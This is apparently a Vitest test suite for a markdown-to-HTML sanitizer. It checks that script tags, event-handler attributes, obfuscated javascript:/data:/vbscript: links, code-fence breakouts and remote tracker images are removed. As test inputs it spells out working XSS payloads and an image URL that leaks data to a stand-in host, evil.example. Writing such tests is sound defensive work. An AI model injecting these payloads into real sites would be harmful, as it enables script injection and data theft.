import { describe, expect, it } from "vitest";
import { markdownToHtml } from "@/lib/markdown";

describe("markdownToHtml with hostile input", () => {
  it("drops raw HTML, script tags and event-handler attributes", async () => {
    const html = await markdownToHtml(
      '<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n<a href="https://x" onclick="alert(1)">x</a>\n\n<iframe src="https://evil.example"></iframe>\n\n<svg onload=alert(1)></svg>\n'
    );
    expect(html).not.toMatch(/<script|<img|<iframe|<svg|onerror|onclick|onload/i);
  });

  it("removes the href from javascript:, data: and vbscript: links, however they are spelled", async () => {
    const html = await markdownToHtml(
      [
        "[a](javascript:alert(1))",
        "[b](JaVaScRiPt:alert(1))",
        "[c](data:text/html,<script>alert(1)</script>)",
        "[d](vbscript:msgbox(1))",
        "[e](java&#x09;script:alert(1))",
        "[f](&#106;avascript:alert(1))",
        "[g](javascript&colon;alert(1))",
        "[ref]\n\n[ref]: javascript:alert(2)",
      ].join("\n\n")
    );
    expect(html).not.toMatch(/javascript:|vbscript:|data:/i);
    // Whatever href survives must be relative (java%09script: is a harmless relative path) or a safe scheme.
    for (const [, href] of html.matchAll(/href="([^"]*)"/g)) {
      expect(href).not.toMatch(/^[a-z][a-z0-9+.-]*:/i);
    }
  });

  it("keeps http, https, mailto, relative and fragment links", async () => {
    const html = await markdownToHtml(
      "[a](https://example.com/x?y=1) [b](http://example.com) [c](mailto:hi@example.com) [d](/spec) [e](#top) [f](../up)"
    );
    for (const href of ["https://example.com/x?y=1", "http://example.com", "mailto:hi@example.com", "/spec", "#top", "../up"]) {
      expect(html).toContain(`href="${href}"`);
    }
  });

  it("replaces remote and script-URL images with their alt text", async () => {
    const html = await markdownToHtml(
      "![tracker](https://evil.example/leak?d=secret) ![proto](//evil.example/x.png) ![js](javascript:alert(1)) ![data](data:image/svg+xml,<svg onload=alert(1)>) ![](https://evil.example/blank.png)"
    );
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).toContain("tracker");
  });

  it("keeps same-origin images", async () => {
    const html = await markdownToHtml("![logo](/brand/logo.svg)");
    expect(html).toContain('<img src="/brand/logo.svg" alt="logo">');
  });

  it("removes unsafe links and images nested inside other elements", async () => {
    const html = await markdownToHtml(
      "> [q](javascript:alert(1))\n\n- ![x](https://evil.example/a.png)\n- **[b](javascript:alert(2))**\n\n| h |\n|---|\n| [t](javascript:alert(3)) |\n"
    );
    expect(html).not.toMatch(/javascript:|evil\.example|<img/i);
  });

  it("cannot break out of the code-fence language class or the code text", async () => {
    const html = await markdownToHtml('```"><script>alert(1)</script>\n<b onclick="x">\n```\n');
    // The quote in the info string is entity-escaped, so the class attribute cannot be closed early,
    // and the code body is escaped text rather than markup.
    expect(html).toContain('<pre><code class="language-&#x22;>');
    expect(html).toContain("&#x3C;b onclick=");
    expect(html).not.toMatch(/<b[\s>]/);
  });

  it("drops raw HTML in a heading and still gives it a slug", async () => {
    const html = await markdownToHtml("# Title <img src=x onerror=alert(1)>\n");
    expect(html).toContain('<h1 id="title-">Title </h1>');
  });
});
